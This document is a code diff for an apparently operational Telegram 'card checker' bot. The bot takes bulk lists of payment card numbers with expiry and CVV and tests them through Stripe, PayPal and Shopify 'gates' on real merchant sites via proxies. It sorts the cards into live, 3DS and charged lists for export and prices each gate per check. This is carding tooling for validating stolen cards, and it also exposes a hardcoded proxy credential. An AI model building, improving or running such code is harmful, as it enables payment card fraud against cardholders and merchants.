@@ -15,12 +15,12 @@ MAX_CARDS = 500
 SEMAPHORE_LIMIT = 10
 
 GATE_CONFIG = {
-    "au":   {"name": "Sᴛʀɪᴘᴇ Aᴜᴛʜ", "url": "https://stripe-auth-test-production.up.railway.app/st0", "site": "fashionspicex.com", "use_proxy": False},
-    "mss":  {"name": "Sᴛʀɪᴘᴇ Mᴀss", "url": "https://stripe-auth-test-production.up.railway.app/st0", "site": "fashionspicex.com", "use_proxy": False},
-    "mpp2": {"name": "PᴀʏPᴀʟ Mᴀss", "url": "https://paypal0-1.onrender.com/pp1/cc={card}", "site": "", "use_proxy": False},
-    "msh":  {"name": "Sʜᴏᴘɪғʏ", "url": "https://autosh.up.railway.app/shopii", "site": "https://powerbuild.store", "use_proxy": True},
-    "mchk": {"name": "Sᴛʀɪᴘᴇ", "url": "https://stripe-auth-test-production.up.railway.app/st0", "site": "fashionspicex.com", "use_proxy": False},
-    "mpp":  {"name": "PᴀʏPᴀʟ", "url": "https://paypal0-1.onrender.com/pp1/cc={card}", "site": "", "use_proxy": False},
+    "au":   {"name": "Sᴛʀɪᴘᴇ Aᴜᴛʜ", "url": "https://stripe-auth-test-production.up.railway.app/st0", "site": "fashionspicex.com", "use_proxy": False, "price": "0$"},
+    "mss":  {"name": "Sᴛʀɪᴘᴇ Mᴀss", "url": "https://stripe-auth-test-production.up.railway.app/st0", "site": "fashionspicex.com", "use_proxy": False, "price": "0$"},
+    "mpp2": {"name": "PᴀʏPᴀʟ Mᴀss", "url": "https://paypal0-1.onrender.com/pp1/cc={card}", "site": "", "use_proxy": False, "price": "0.10$"},
+    "msh":  {"name": "Sʜᴏᴘɪғʏ", "url": "https://autosh.up.railway.app/shopii", "site": "https://powerbuild.store", "use_proxy": True, "price": "1$"},
+    "mchk": {"name": "Sᴛʀɪᴘᴇ", "url": "https://stripe-auth-test-production.up.railway.app/st0", "site": "fashionspicex.com", "use_proxy": False, "price": "0$"},
+    "mpp":  {"name": "PᴀʏPᴀʟ", "url": "https://paypal0-1.onrender.com/pp1/cc={card}", "site": "", "use_proxy": False, "price": "0.10$"},
 }
 
 def load_list_from_file(filename: str, default_list: list) -> list:
@@ -37,8 +37,10 @@ PROXIES = load_list_from_file("proxies.txt", ["http://purevpn0s12153504:1LTpwxbC
 SITES = load_list_from_file("sites.txt", ["https://powerbuild.store"])
 
 def parse_cards(text: str) -> list:
+    """Parse cards from text with multiple formats"""
     cards = []
-    # Split by newlines, pipes, semicolons, commas
+    
+    # Split by common separators
     for sep in ['\n', '|', ';', ',']:
         text = text.replace(sep, '\n')
     
@@ -48,18 +50,16 @@ def parse_cards(text: str) -> list:
         if not line:
             continue
             
-        # Check if it's in format cc|mm|yy|cvv or cc|mm|yyyy|cvv
+        # Check for format: cc|mm|yy|cvv
         parts = line.split('|')
         if len(parts) >= 4:
-            # Try to combine if split incorrectly
-            card_part = parts[0].strip()
-            # Check if it's a valid card number (at least 13 digits)
-            if re.search(r'\d{13,19}', card_part):
+            card_num = parts[0].strip()
+            # Check if it's a valid card number (13-19 digits)
+            if re.search(r'\d{13,19}', card_num):
                 cards.append(line)
             continue
         
-        # Try to find card pattern in the line
-        # Pattern: 13-19 digits optionally followed by |mm|yy|cvv
+        # Try to find card pattern with separators
         match = re.search(r'(\d{13,19})\s*[|,;]\s*(\d{1,2})\s*[|,;]\s*(\d{2,4})\s*[|,;]\s*(\d{3,4})', line)
         if match:
             cards.append(f"{match.group(1)}|{match.group(2)}|{match.group(3)}|{match.group(4)}")
@@ -73,6 +73,7 @@ def parse_cards(text: str) -> list:
     return cards
 
 async def _download_file_cards(bot, file_id: str) -> str | None:
+    """Download a text file from Telegram and return its content as string."""
     try:
         file = await bot.get_file(file_id)
         content = await file.download_as_bytearray()
@@ -87,6 +88,7 @@ async def _download_file_cards(bot, file_id: str) -> str | None:
         return None
 
 async def extract_cards_from_update(update: Update, bot) -> list | None:
+    """Extract cards from multiple input methods including files"""
     msg = update.message
     
     # 1. Direct text after command (args)
@@ -95,9 +97,8 @@ async def extract_cards_from_update(update: Update, bot) -> list | None:
         if cards: 
             return cards
     
-    # 2. Check if there's a file attached
+    # 2. Check if there's a file attached (direct file upload)
     if msg.document and msg.document.file_id:
-        # Download and parse the file content
         content = await _download_file_cards(bot, msg.document.file_id)
         if content:
             cards = parse_cards(content)
@@ -110,7 +111,6 @@ async def extract_cards_from_update(update: Update, bot) -> list | None:
         
         # Reply to text message
         if replied.text and replied.text.strip():
-            # Check if it's a file name or just text with cards
             cards = parse_cards(replied.text)
             if cards: 
                 return cards
@@ -123,13 +123,11 @@ async def extract_cards_from_update(update: Update, bot) -> list | None:
                 if cards: 
                     return cards
     
-    # 4. Message text (if user typed cards directly)
-    if msg.text and msg.text.strip():
-        # If it's a command, skip (already handled by args)
-        if not msg.text.startswith('/'):
-            cards = parse_cards(msg.text)
-            if cards: 
-                return cards
+    # 4. Message text (if user typed cards directly without command)
+    if msg.text and msg.text.strip() and not msg.text.startswith('/'):
+        cards = parse_cards(msg.text)
+        if cards: 
+            return cards
 
     return None
 
@@ -158,9 +156,16 @@ async def deduct_credits(context: ContextTypes.DEFAULT_TYPE, user_id: int, amoun
     return True
 
 def create_result_buttons() -> InlineKeyboardMarkup:
+    """Create the 4 action buttons for result"""
     return InlineKeyboardMarkup([
-        [InlineKeyboardButton("✅ LIVE", callback_data="result_live"), InlineKeyboardButton("🔐 3DS", callback_data="result_3ds")],
-        [InlineKeyboardButton("💎 CHARGE", callback_data="result_charge"), InlineKeyboardButton("📦 ALL", callback_data="result_all")]
+        [
+            InlineKeyboardButton("✅ LIVE", callback_data="result_live"),
+            InlineKeyboardButton("🔐 3DS", callback_data="result_3ds"),
+        ],
+        [
+            InlineKeyboardButton("💎 CHARGE", callback_data="result_charge"),
+            InlineKeyboardButton("📦 ALL", callback_data="result_all"),
+        ]
     ])
 
 async def check_single_card(session, gate_key, api_url, site, card, proxy, semaphore):
@@ -182,6 +187,7 @@ async def check_single_card(session, gate_key, api_url, site, card, proxy, semap
             response_text = str(data.get("Response") or data.get("response") or data.get("message") or "ERROR").strip()
             status = str(data.get("Status") or data.get("status") or "false").lower()
             
+            # Determine card status
             if status == "true" or "approved" in response_text.lower(): 
                 card_status = "approved"
             elif "3ds" in response_text.lower() or "3d secure" in response_text.lower(): 
@@ -191,7 +197,13 @@ async def check_single_card(session, gate_key, api_url, site, card, proxy, semap
             else: 
                 card_status = "dead"
             
-            return {"card": card, "response": response_text, "status": status, "card_status": card_status, "error": None}
+            return {
+                "card": card, 
+                "response": response_text, 
+                "status": status, 
+                "card_status": card_status, 
+                "error": None
+            }
         except asyncio.TimeoutError:
             return {"card": card, "error": "TIMEOUT", "response": "TIMEOUT", "status": "false", "card_status": "dead"}
         except Exception as e:
@@ -203,6 +215,7 @@ async def process_mass(update: Update, context: ContextTypes.DEFAULT_TYPE, gate_
     api_url = cfg["url"]
     site = cfg["site"]
     use_proxy = cfg["use_proxy"]
+    price = cfg["price"]
     
     if not context.bot_data.get(f"{gate_key}_on", True):
         await update.message.reply_text("⚠️ Gᴀᴛᴇ ➤ OFF", parse_mode="HTML")
@@ -240,7 +253,7 @@ async def process_mass(update: Update, context: ContextTypes.DEFAULT_TYPE, gate_
         dynamic_sites = [site]
 
     msg = await update.message.reply_text(
-        f"[₪] Gᴀᴛᴇ ➺ {gate_name} | 0-5 Usd \n━━━━━━━━━━━━━━\n      [◈] Sᴛᴀᴛᴜs ➺ Sᴛᴀʀᴛɪɴɢ...\n━━━━━━━━━━━━━━\n📊 Cᴀʀᴅꜱ ➺ {len(cards)}{proxy_info}\n━━━━━━━━━━━━━━━━━━━━\n⏳ Pʀᴏᴄᴇꜱꜱɪɴɢ...", 
+        f"[₪] Gᴀᴛᴇ ➺ {gate_name} | {price} Usd \n━━━━━━━━━━━━━━\n      [◈] Sᴛᴀᴛᴜs ➺ Sᴛᴀʀᴛɪɴɢ...\n━━━━━━━━━━━━━━\n📊 Cᴀʀᴅꜱ ➺ {len(cards)}{proxy_info}\n━━━━━━━━━━━━━━━━━━━━\n⏳ Pʀᴏᴄᴇꜱꜱɪɴɢ...", 
         parse_mode="HTML"
     )
 
@@ -263,14 +276,21 @@ async def process_mass(update: Update, context: ContextTypes.DEFAULT_TYPE, gate_
     dead_list = [r for r in parsed if not r.get("error") and r.get("card_status") == "dead"]
     error_list = [r for r in parsed if r.get("error")]
 
+    # Store results for button actions
     context.bot_data[f"{gate_key}_results_{update.effective_user.id}"] = {
-        "parsed": parsed, "approved": approved_list, "charged": charged_list, 
-        "threeds": threeds_list, "dead": dead_list, "error": error_list, 
-        "gate": gate_name, "total": len(parsed)
+        "parsed": parsed, 
+        "approved": approved_list, 
+        "charged": charged_list, 
+        "threeds": threeds_list, 
+        "dead": dead_list, 
+        "error": error_list, 
+        "gate": gate_name,
+        "price": price,
+        "total": len(parsed)
     }
 
     lines = [
-        f"[₪] Gᴀᴛᴇ ➺ {gate_name} | 0-5 Usd ",
+        f"[₪] Gᴀᴛᴇ ➺ {gate_name} | {price} Usd ",
         "━━━━━━━━━━━━━━",
         f"      [◈] Sᴛᴀᴛᴜs ➺ Fɪɴɪsʜᴇᴅ ✅",
         f"      [𖣸] Cʜᴇᴄᴋᴇᴅ ➺ {len(parsed)}/{len(cards)}",
@@ -284,6 +304,9 @@ async def process_mass(update: Update, context: ContextTypes.DEFAULT_TYPE, gate_
     ]
     await msg.edit_text("\n".join(lines), parse_mode="HTML", reply_markup=create_result_buttons())
 
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+# MASS COMMAND HANDLERS
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 async def cmd_au(update, context): await process_mass(update, context, "au")
 async def cmd_mss(update, context): await process_mass(update, context, "mss")
 async def cmd_mpp2(update, context): await process_mass(update, context, "mpp2")
@@ -291,11 +314,15 @@ async def cmd_msh(update, context): await process_mass(update, context, "msh")
 async def cmd_mchk(update, context): await process_mass(update, context, "mchk")
 async def cmd_mpp(update, context): await process_mass(update, context, "mpp")
 
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+# CALLBACK HANDLER FOR RESULT BUTTONS
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 async def mass_callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     await query.answer()
     user_id = query.from_user.id
     
+    # Find the results for this user
     data_key = None
     for prefix in GATE_CONFIG.keys():
         key = f"{prefix}_results_{user_id}"
@@ -314,35 +341,58 @@ async def mass_callback_handler(update: Update, context: ContextTypes.DEFAULT_TY
     
     if data == "result_live":
         file_name = f"live_cards_{user_id}.txt"
-        file_content = "\n".join([r["card"] for r in results.get("approved", [])])
-        if not file_content: 
+        approved = results.get("approved", [])
+        if approved:
+            file_content = "\n".join([r["card"] for r in approved])
+        else:
             file_content = "No approved (live) cards found."
+            
     elif data == "result_3ds":
         file_name = f"3ds_cards_{user_id}.txt"
-        file_content = "\n".join([r["card"] for r in results.get("threeds", [])])
-        if not file_content: 
+        threeds = results.get("threeds", [])
+        if threeds:
+            file_content = "\n".join([r["card"] for r in threeds])
+        else:
             file_content = "No 3DS cards found."
+            
     elif data == "result_charge":
         file_name = f"charged_cards_{user_id}.txt"
-        file_content = "\n".join([r["card"] for r in results.get("charged", [])])
-        if not file_content: 
+        charged = results.get("charged", [])
+        if charged:
+            file_content = "\n".join([r["card"] for r in charged])
+        else:
             file_content = "No charged cards found."
+            
     elif data == "result_all":
         file_name = f"all_results_{user_id}.txt"
-        lines = []
-        for r in results.get("parsed", []):
-            card = r.get("card", "N/A")
-            status = r.get("card_status", "N/A").upper()
-            resp = r.get("response", "N/A")
-            lines.append(f"{card} - {status} - {resp}")
-        file_content = "\n".join(lines)
-        if not file_content: 
+        parsed = results.get("parsed", [])
+        if parsed:
+            lines = []
+            for r in parsed:
+                card = r.get("card", "N/A")
+                status = r.get("card_status", "N/A").upper()
+                resp = r.get("response", "N/A")
+                lines.append(f"Card: {card}")
+                lines.append(f"Status: {status}")
+                lines.append(f"Response: {resp}")
+                lines.append("-" * 30)
+            file_content = "\n".join(lines)
+        else:
             file_content = "No cards processed."
         
+    # Send the file
     bio = BytesIO(file_content.encode('utf-8'))
     bio.name = file_name
-    await context.bot.send_document(chat_id=query.message.chat_id, document=bio, filename=file_name)
+    await context.bot.send_document(
+        chat_id=query.message.chat_id, 
+        document=bio, 
+        filename=file_name,
+        caption=f"📊 {results.get('gate', 'Unknown')} Results"
+    )
 
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+# EXPORT HANDLERS
+# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 def get_mass_handlers():
     return [
         CommandHandler("au", cmd_au),
